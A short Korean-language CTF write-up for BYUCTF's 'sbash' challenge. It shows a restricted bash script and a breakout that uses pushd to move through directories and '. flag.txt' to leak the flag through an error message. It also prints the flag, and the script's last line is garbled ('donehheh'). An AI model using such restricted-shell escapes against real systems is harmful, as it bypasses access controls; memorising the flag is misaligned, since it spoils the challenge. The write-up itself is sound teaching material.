# sbash Writeup - BYUCTF

## 문제 코드
```bash
#!/bin/bash

unset PATH
enable -n exec
enable -n command
enable -n type
enable -n hash
enable -n cd
enable -n enable
set +x

echo "Welcome to my new bash, sbash, the Safe Bourne Again Shell! There's no exploiting this system"

while true; do
    read -p "safe_bash> " user_input
    
    # Check if input is empty
    [[ -z "$user_input" ]] && continue

    case "$user_input" in 
        *">"*|*"<"*|*"/"*|*";"*|*"&"*|*"$"*|*"("*|*"\`"*) echo "No special characters, those are unsafe!" && continue;;
    esac

    # Execute only if it's a Bash builtin
    eval "$user_input"
donehheh
```
---

## Description

쉘 환경이 제한되어 있는 `sbash`라는 커스텀 쉘에서 flag를 얻는 문제이다.  
문제를 처음 접속하면 일반적인 명령어들이 제한되어 있으며, 대부분의 경로 탐색 기능이 비활성화된 듯 보인다.

---

## Exploitation

1. 처음 디렉토리는 `/app`
2. `pushd ..` 명령어를 통해 상위 디렉토리로 이동하면 디렉토리 스택이 생기고, 현재 디렉토리 경로가 출력된다.

```bash
pushd ..
/ /app
```

3. 이후 pushd flag로 flag 디렉토리 접근 성공

```bash
pushd flag
/flag / /app
```
4. 디렉토리 내부에 flag.txt 파일이 존재함을 가정하고, . flag.txt 명령어 사용 (bash에서 .는 source 명령어의 alias로, 파일을 실행함)

```bash
. flag.txt
flag.txt: line 1: byuctf{enable_can_do_some_funky_stuff_huh?_488h33d}:
```

FLAG : byuctf{enable_can_do_some_funky_stuff_huh?_488h33d}

